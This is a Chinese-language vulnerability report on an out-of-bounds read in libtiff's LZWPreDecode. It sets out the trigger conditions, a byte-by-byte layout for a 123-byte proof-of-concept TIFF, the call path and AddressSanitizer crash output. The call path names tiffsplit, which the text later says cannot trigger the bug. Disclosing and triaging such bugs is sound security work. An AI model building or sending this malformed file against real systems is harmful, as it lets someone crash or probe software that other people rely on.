# VULN 001 — LZWPreDecode OOB Read via 1-Byte LZW Strip at mmap EOF

## 漏洞位置

`libtiff/tif_lzw.c`, 函数 `LZWPreDecode()`, 第 268 行：

```c
if (tif->tif_rawdata[0] == 0 && (tif->tif_rawdata[1] & 0x1)) {
```

## 触发条件

1. `Compression = 5`（LZW 压缩）
2. `StripByteCounts[i] = 1`（该 strip 仅有 1 字节原始数据）
3. strip 数据字节值为 `0x00`，使 `tif_rawdata[0] == 0` 为真，进而读取 `tif_rawdata[1]`
4. `StripOffsets[i] = file_size - 1`，即该字节位于文件映射的最末位置
   - 在 mmap 路径下，`rawdata[1]` 访问的地址已越出映射区域 → OOB Read

## PoC 文件布局（123 字节）

```
Offset 0-7:    TIFF header (little-endian, IFD @ 8)
Offset 8-121:  IFD  (2 + 9*12 + 4 = 114 bytes)
               Tags: ImageWidth=1, ImageLength=1, BitsPerSample=8,
                     Compression=5, PhotometricInterpretation=1,
                     StripOffsets=122, SamplesPerPixel=1,
                     RowsPerStrip=1, StripByteCounts=1
Offset 122:    Strip 数据: 0x00  ← StripOffset 指向此处（= file_size - 1）
```

## 调用路径

```
tiffsplit main()
  → TIFFOpen()
  → TIFFReadEncodedStrip()
  → TIFFFillStrip()
    → TIFFStartStrip()
    → LZWPreDecode()      ← 在此发生 OOB Read（line 268）
```

## 实际触发现象（已验证）

```
==ERROR: AddressSanitizer: unknown-crash on address 0x7f...000 at pc ...
READ of size 1 at 0x7f...000 thread T0
    #0 ... in LZWPreDecode libtiff.so.3+0x36c6dd
    #1 ... in TIFFStartStrip
    #2 ... in TIFFFillStrip
    #3 ... in TIFFReadEncodedStrip
    ...
SUMMARY: AddressSanitizer: unknown-crash ... in LZWPreDecode
```

- ASAN 报告 `unknown-crash`（wild pointer READ of size 1）
- 触发地址是 mmap 边界之后（past-EOF 访问）
- 由 `tiffinfo -D -d` 触发，不由 tiffsplit 触发

## 关于 tiffsplit 的说明

tiffsplit 使用 `TIFFReadRawStrip`（原始字节复制），而非 `TIFFReadEncodedStrip`（解码路径）。
因此 tiffsplit **不经过** `LZWPreDecode`，无法触发此漏洞。
正确触发工具为 `tiffinfo -D -d`，它调用 `TIFFReadEncodedStrip` 解码路径。
